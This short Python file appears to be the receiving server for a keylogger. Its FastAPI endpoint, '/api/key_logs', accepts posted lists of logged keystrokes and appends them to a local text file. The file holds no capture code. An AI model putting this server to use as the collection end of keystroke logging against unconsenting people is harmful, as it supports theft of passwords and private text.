from fastapi import FastAPI
import json
import uvicorn

app = FastAPI()

@app.post("/api/key_logs")
async def receive_key_logs(logs: list):
    with open("server_key_logs.txt", "a") as f:
        json.dump(logs, f, indent=2)
        f.write("\n")
    return {"message": "Data received"}

if __name__ == '__main__':
    uvicorn.run(app, host="0.0.0.0", port=8000)